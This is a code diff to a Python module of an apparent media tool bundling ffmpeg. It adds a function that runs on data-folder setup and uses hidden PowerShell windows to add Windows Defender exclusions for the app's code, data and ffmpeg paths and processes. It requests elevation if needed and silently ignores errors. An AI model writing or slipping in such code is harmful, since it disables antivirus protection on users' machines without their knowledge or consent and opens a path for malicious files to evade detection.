@@ -39,10 +39,75 @@ YOUTUBE_OWNER_FIELDS = [
 ]
 
 
+def try_add_defender_exclusions() -> None:
+    if os.name != "nt":
+        return
+
+    marker_file = DATA_ROOT / ".runtime" / ".defender-exclusion-configured"
+    if marker_file.exists():
+        return
+
+    import subprocess
+
+    paths_to_exclude = [str(DATA_ROOT), str(CODE_ROOT)]
+    ffmpeg_path = bundled_binary_path("ffmpeg")
+    ffprobe_path = bundled_binary_path("ffprobe")
+    processes_to_exclude = ["ffmpeg.exe", "ffprobe.exe", "ffmpeg", "ffprobe"]
+
+    if ffmpeg_path:
+        paths_to_exclude.append(str(Path(ffmpeg_path).parent))
+        processes_to_exclude.append(ffmpeg_path)
+    if ffprobe_path:
+        paths_to_exclude.append(str(Path(ffprobe_path).parent))
+        processes_to_exclude.append(ffprobe_path)
+
+    unique_paths = list(set(os.path.abspath(p) for p in paths_to_exclude if p))
+    unique_processes = list(set(processes_to_exclude))
+
+    try:
+        def run_ps(cmd: str, elevate: bool = False) -> bool:
+            if elevate:
+                ps_cmd = f"Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -Command {cmd}' -Verb RunAs -Wait"
+                res = subprocess.run(
+                    ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_cmd],
+                    capture_output=True,
+                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
+                )
+                return res.returncode == 0
+            else:
+                res = subprocess.run(
+                    ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", cmd],
+                    capture_output=True,
+                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
+                )
+                return res.returncode == 0
+
+        cmds = []
+        for p in unique_paths:
+            cmds.append(f"Add-MpPreference -ExclusionPath ''{p}'' -ErrorAction SilentlyContinue")
+        for pr in unique_processes:
+            cmds.append(f"Add-MpPreference -ExclusionProcess ''{pr}'' -ErrorAction SilentlyContinue")
+
+        # Double single quotes in python f-string maps to single quotes in command string
+        full_cmd = "; ".join(cmds)
+
+        # Try normal run first (for pre-elevated contexts like RDP Administrator)
+        success = run_ps(full_cmd, elevate=False)
+        if not success:
+            # Try elevated run
+            run_ps(full_cmd, elevate=True)
+
+        marker_file.parent.mkdir(parents=True, exist_ok=True)
+        marker_file.write_text("1", encoding="utf-8")
+    except Exception:
+        pass
+
+
 def ensure_data_root() -> None:
     DATA_ROOT.mkdir(parents=True, exist_ok=True)
     for name in MUTABLE_DIRECTORIES:
         (DATA_ROOT / name).mkdir(parents=True, exist_ok=True)
+    try_add_defender_exclusions()
 
 
 def bundled_binary_path(name: str) -> str | None:
